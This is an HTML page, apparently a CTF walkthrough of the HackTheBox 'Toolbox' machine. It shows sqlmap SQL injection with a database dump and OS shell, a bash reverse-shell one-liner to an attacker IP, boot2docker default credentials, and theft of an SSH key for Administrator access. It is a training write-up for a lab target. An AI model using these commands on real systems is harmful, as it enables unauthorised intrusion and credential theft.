@@ -1,0 +1,96 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/" rel="category tag">HackTheBox</a></span>            </div>
+            <h1 class="post-title entry-title">Toolbox HackTheBox Walkthrough</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/hackthebox-toolbox-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2022-01-15T17:53:35+00:00">January 15, 2022</time><time class="updated" datetime="2025-06-20T13:00:56+00:00">June 20, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">Toolbox is a CTF Windows box with difficulty rated as “easy” on the HackTheBox platform. The machine covers SQL injections, gaining interactive shell, escaping container and escalating privileges from boot2docker VM by using a private SSH key.</span></p>
+<h3><span style="color: #800000;">Table of Content</span></h3>
+<p><span style="color: #000000;"><strong>Network Scanning</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Nmap</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Enumeration</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Inspecting the SSL certificate on the admin.megalogistic.com domain</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Exploitation</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Exploiting POST-based SQL injection</span></li>
+<li><span style="color: #000000;">Spawning interactive shell using SQLi</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Privilege Escalation</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Escaping docker VM boot2docker using default credentials</span></li>
+<li><span style="color: #000000;">Vertical escalation using readable private SSH key found on a mount point</span></li>
+</ul>
+<p> </p>
+<p><span style="color: #000000;">Let’s deep dive into this.</span></p>
+<h3><span style="color: #800000;">Network Scanning</span></h3>
+<p><span style="color: #000000;">The dedicated IP address of the machine is <strong>10.129.224.18. </strong>We’ll run an nmap scan on this machine’s IP</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -A 10.129.224.18</pre>
+<p><span style="color: #000000;">Open ports are:</span></p>
+<ul>
+<li><span style="color: #000000;">21 running FTP with anonymous login enabled</span></li>
+<li><span style="color: #000000;">22 running SSH</span></li>
+<li><span style="color: #000000;">135 running RPC</span></li>
+<li><span style="color: #000000;">139 running NetBIOS</span></li>
+<li><span style="color: #000000;">443 running HTTPS server</span></li>
+<li><span style="color: #000000;">445 running SMB server</span></li>
+</ul>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEg6u0LvFCKytOA7PaXgDI16y4HhXgepdRw4BcgHmjWhCap4w1blYGP1gqUB6hasQo_NpzVXPGhPGn7HWZp_mTI9ZkiI2s5u-vr5j43Gy1S5Ypxz5fysocDgFqxWOyoOqp5L6GHZ42yYDFNPSh0rDc2dGnVXsizHM5WYwz_1POQmI5yaOoP-hKzWgoYqeg=s16000"/></span></p>
+<p><span style="color: #000000;">Upon opening the IP in the browser, we see a logistics website running</span></p>
+<p><span style="color: #000000;"><strong> <img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEjhJhjdFH7jzu6t13tT98m9ERe1Yhk_1Blmz6_-2kgw8aO8l9VGiU56ZpfXXG-5M1K55xutWfced5RJqSae6Pmdjc-4C2DC-q5_KsK070XXifhBsRsKEAVCyQrkH6_RcfVonlC0NPwSTQ2_zouFyYrQMo8F_YEEQVu91EcAdshgVtCUtGmeokJG9huVoA=s16000"/></strong></span></p>
+<h3><span style="color: #800000;">Enumeration</span></h3>
+<p><span style="color: #000000;">Upon inspecting the SSL certificate, we found that SSL is registered with the domain: <strong>admin.megalogistic.com</strong></span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEidJgKZBRAIG9KoxOGeheTgAuVMRzgtWpq_WCTHzrsK5YJLf-1wJqGSWx3Vl-cDDvXA3Ataxajvy3ATszj0sg7QvSWparX13nxzOg5nZL5kX815uHoboTEoJ0awb1ywHu1G8vrSavWUNWyC8MiPi5tUNJajwetH1tz3Pfns0_3Hmapgeqw8lp4KyOh3nw=s16000"/></span></p>
+<p><span style="color: #000000;">So, after adding this IP in /etc/hosts as <strong>admin.megalogistic.com</strong>, we open it in our browser and see a login page.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEhNuMaj2pXMUaf5eSpLWLJ-g0TJcwLR82iPFVVMMQUOrsSwB3m_0RiQdHTYk9JO50KpWxtUiVydYj6ZFdieNB7pSL32u2aWBURbLdCZlrHBB84tab60LA9h58pIMevkd9DRCXPjXBw61fNLusRlha0rn78RjZ8SMG74nQlCIJLu1FwVwl41ayiRjIov5Q=s16000"/></span></p>
+<h3><span style="color: #800000;">Exploitation</span></h3>
+<p><span style="color: #000000;">Upon hitting and trying other options, we decided to check the login page against SQL injections. So, we’ll input random username and passwords and capture this request using Burpsuite.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEhuiI-nnX3-JlxKenYZ6HaSDV4o1uk_SIlNsLPsOYTSlp56Al0XnXS2C03lmRD-J_NNEZDjBNsbiQGhV2L9EfCORxkeCeyyBAWNOsIpb1ALY24M0VGDNPN1oD9jc-ygosOrhK1lk0vS-cu4SWsS_HaaL1n1qsaUxlgQIxDmjcQ2xWH-vLzyZkniyW1UCw=s16000"/></span></p>
+<p><span style="color: #000000;">We can save this request into a file “req.txt” and then run sqlmap to check if there exists an SQLi vulnerability. As we can see upon running sqlmap, site is vulnerable to SQLi and has in turn given us out three existing databases too!</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">sqlmap -r req.txt --dbs --force-ssl --batch</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEhUEcPxnFSUOA8u8e1XasrfRRgub-52DRPyM3yYaVbq3pRIWwU7dZV5zuUqkrv8R12fRwNccGjyQAcGAQ0FhMCF_TBpv7cVSC1gVwzFH6xV1abio77vVhSoDTN2mzGcKrcapM_7MZIgyrmNIvKCNHHZUrjwSNMp8Sj3buxEew41AZAyNnrQqyT1kOVUoA=s16000"/></span></p>
+<p><span style="color: #000000;">The database “public” seemed interesting and thus, we tried to dump its content.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">sqlmap -r req.txt --dbs --force-ssl -D public --dump-all --batch</pre>
+<p><span style="color: #000000;">It fetched us hashed credential of a user admin.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEhmixFDMbIsow2Z81fo07jBmZcDYkQIUzLY86nr8TDwCJga9HpwLxoda7bUVKpUrzD3M9dnqo1hq1ppltMZrpL-YF5aSztu8kgoHp8SlQgN9xy8QSCKlUkuSoB9Nn93TmiNx7ScOe7xFjYElK8TLPa0CyUrJgf8Kx2-aUhuE57PIdNzwczJglN7EROVzQ=s16000"/></span></p>
+<p><span style="color: #000000;">Trying to login using this credential failed to yield any fruit. So, we tried to spawn an interactive shell using sqlmap itself</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">sqlmap -r req.txt --force-ssl --batch --os-shell</pre>
+<p><span style="color: #000000;">As you can see, an interactive teletype has been spawned. Note that if the command above throws an error try this command instead:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">sqlmap -r req.txt --force-ssl --batch --os-shell --flush-session --time-sec=20</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEjKCU3NZ6D1XGBo_jqjyAVIm0Y3XJHUsc6zzcIuGWfeOwfI1hBX3X6l3it4rrNrn9Z9r2EH9-uI1oEYlWF6M7_OXuXVvq7ZsnHZFLOixjswsjqXjJcKiWyWFSrKajctD4qo_FULdqM0lNLLDKXaN8vGHQYUKG3oT-txPWTlB8XH_zIX5W2h6iKurZLq4Q=s16000"/></span></p>
+<p><span style="color: #000000;">Then, we used this os-shell and gained a much more efficient bash shell using bash one liner</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">bash -c 'bash -i &amp;&gt; /dev/tcp/10.10.14.100/4444 0&gt;&amp;1'</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEhHz3C95ZXdG6heKYhAnNj6dxPDxQBKLjff6_i-_EgqEzjqlfrAZ-h9T-vDnxDWRdJL3SbbxxQ7ieCY81oue4a_lSM6IaOS9qI8Dme_2J73LKuNnA7ewssLGFCuh_wwD3rfiTAe0mCK2FBfpqO8uQRqvdUpZVkA9O5hkmDl7G72za66nMMC60hhV1nNyA=s16000"/></span></p>
+<p><span style="color: #000000;">We have spawned a bash shell on our listener set up!</span></p>
+<h3><span style="color: #800000;">Privilege Escalation</span></h3>
+<p><span style="color: #000000;">When we run ifconfig, we see that the IP address suggests the installation of a docker container here. Upon typing “uname – a” we can confirm that boot2docker virtual machine is running. Docker-Toolbox is used to manage container VMs on a system. (now I understand the box’s name!) When we read the documentation <a style="color: #000000;" href="https://github.com/boot2docker/boot2docker">here</a> we see that the docker host is always present at the gateway IP address with default credentials- <strong>docker:tcuser</strong></span></p>
+<p><span style="color: #000000;">Since the container IP is 172.17.0.2, the gateway IP is 172.17.0.1. We tried to login to docker user using default credentials and were successful!</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">ifconfig
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+ssh docker@172.17.0.1
+tcuser</pre>
+<p><span style="color: #000000;">Furthermore, upon inspecting sudoers file, we see that docker could run any command as root and so we compromise the root user of this boot2docker VM using the command</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">sudo -i</pre>
+<p><span style="color: #000000;">In the system directory, we find an interesting folder “c”</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEiKXzGGFaSFbpWJcUJg19oW8nR0ZYmco_KxZ_O4J-FtT6oxCKrfv3orus0ucbcTumeeWvc-EeqiLidTRPi3c4-_mKQJysizPf82nTLobD9zdJ-bSuBnSOa8JVQJoj9OwMo0523LeAWEtQV4K6G2Hu77I4yJjhFQ_gzZk1AB0aU9FbDpnf9oSWDvUSkj1Q=s16000"/></span></p>
+<p><span style="color: #000000;">Clearly the system has mounted C: directory from the base windows system. We traversed this mount and see that a directory “.ssh” had 777 permissions</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEiCnWCAQPeMGFLZEtccL1zMkn1tiLyXZSxqd7PHfPsJ6t_XKdesvpyiRUikaGlpLzJ9uQCXI6hA4oOzNTL1ekuyjuSRhPIwoS8osBnZf6A0cSM2NNt6y8L8lYP9_A1XFsF-j6ye0fYIv9IdGAv7ZgEtG076QV7umxXxfgWYI8LS_0mxyjeXXkaFoYomdg=s16000"/></span></p>
+<p><span style="color: #000000;">We go into this directory and copy this private SSH key onto our local system.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEiJg9PAKbu0sIiyZD7STdVsDKuK079BB_5ksH2MNpEynLN_azwgEcuXle_b7r2wELjd8ANSwptii_RKce8-0FRh6qXrkHrfyWjwmqU6jx-myHntjDLx5MJuEHo8CxRDciJT58ex_7MHOTgmGxHvwq6XnyikYnYOV2774TapTHo5YNx3zhUCHNx5SBHh9w=s16000"/></span></p>
+<p><span style="color: #000000;">Then we can save this file with the name “key”, change its permissions to 600 and connect to the Administrator account of the Windows system.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nano key
+chmod 600 key
+ssh -i key administrator@10.129.224.18</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEiZVxj8g3iomxWBuDmt3f7gmN0iQEP6ZHubkD5Q6O9ZmQJ4Qb_RMnxKpBNRDf-6wwHEHVbon2e_MAo9ZAxNERhm1tlLStMNM6RNBHkuAYeurERv6RHXckoefxyiNcJQkJ7i_3wy8RRkDlmwux0pxLQEMQPVzPQ8jCuMFNXEKyOJh5cyYjWUATUTjBFgLg=s16000"/></span></p>
+<p><span style="color: #000000;">This way we are able to escalate our privileges vertically! We can go to the Desktop of this system and read the congratulatory flag.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEiY_DpVjCyxM4FvzoMxIoh98j5683bSHJRNqjGpsegWAGulw-a9kDw-uEO9gQxwHKO5WVW4aymT7IWybCWob7dHG9nqyL4HR0_o9DBeb3Tpw_UBI5q_MUW-Y3L4blFm73r2SBFNbo9GPdojAfN-emv1UcYaAAN8vSjD9m-_7jjR2LtV25hp4E2ryhovQw=s16000"/></span></p>
+<p><span style="color: #000000;">Thank you for giving your precious time to read this walkthrough. I hope you have enjoyed and learned something new today. If you want to read more HTB Write-ups. Follow this</span> <strong><a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/">Link.</a></strong> <span style="color: #000000;">Happy Hacking!</span></p>
+<p><span style="color: #000000;"><strong>Author: Harshit Rajpal </strong>is an InfoSec researcher and left and right brain thinker. Contact</span><strong> <a class="broken_link" href="https://in.linkedin.com/in/harshit-rajpal-79bb43103">here</a></strong></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
